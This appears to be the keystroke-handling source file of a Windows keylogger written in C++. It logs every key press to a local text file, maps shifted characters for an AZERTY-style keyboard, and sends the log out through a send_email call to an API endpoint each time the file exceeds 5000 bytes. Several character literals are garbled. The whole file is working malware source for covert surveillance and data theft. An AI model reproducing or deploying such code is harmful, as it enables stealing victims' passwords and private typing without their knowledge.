#include <Windows.h>
#include <iostream>
#include <fstream>
#include <vector>

#include "copy_to_text_file.hpp"
#include "observer.hpp"
#include "string"
#include "observer.hpp"
#include "send_email.hpp"

static bool is_caps_or_shift_pressed() {
	bool is_shift_pressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0, is_caps_lock_active = (GetKeyState(VK_CAPITAL) & 0x01) != 0;
	return is_shift_pressed ^ is_caps_lock_active;
}

void process_key_evt(DWORD VK_code, bool is_key_down, const std::string& api_endpoint_url, const std::vector<std::wstring>& subkey_names) {
    const std::string file_name = "key_log.txt";
    static std::ofstream out_file(file_name, std::ios::app);
    std::streampos size = cron_task(file_name);
    if (size > 5000) {
		send_email(api_endpoint_url, subkey_names, file_name);
		out_file.close();
		out_file.open(file_name, std::ios::trunc);
    }

    if (is_key_down) {
        if (VK_code == VK_SPACE) {
            out_file << "[SPACE]";
        }
        else {
            UINT mapped_char = MapVirtualKey(VK_code, MAPVK_VK_TO_CHAR);
            if (VK_code >= 0x41 && VK_code <= 0x5A) {
                if ((VK_code >= 0x41 && VK_code <= 0x5A) && !is_caps_or_shift_pressed()) {
                    mapped_char += 32;
                }
                out_file << static_cast<char>(mapped_char);
            } else if (VK_code >= 0x30 && VK_code <= 0x39) {
                switch (VK_code) {
                    case 0x30:
						out_file << (!is_caps_or_shift_pressed() ? '�' : '0');
						break;
					case 0x31:
                        out_file << (!is_caps_or_shift_pressed() ? '&' : '1');
                        break;
                    case 0x32:
						out_file << (!is_caps_or_shift_pressed() ? '�' : '2');
						break;
                    case 0x33:
                        out_file << (!is_caps_or_shift_pressed() ? '"' : '3');
                        break;
                    case 0x34:
						out_file << (!is_caps_or_shift_pressed() ? '\'' : '4');
						break;
                    case 0x35:
						out_file << (!is_caps_or_shift_pressed() ? '(' : '5');
						break;
					case 0x36:
                        out_file << (!is_caps_or_shift_pressed() ? '�' : '6');
                        break;
                    case 0x37:
                        out_file << (!is_caps_or_shift_pressed() ? '�' : '7');
                        break;
                    case 0x38:
						out_file << (!is_caps_or_shift_pressed() ? '!' : '8');
						break;
                    case 0x39:
                        out_file << (!is_caps_or_shift_pressed() ? '�' : '9');
                        break;
                }
            }
        }
        out_file.flush();
    }
}
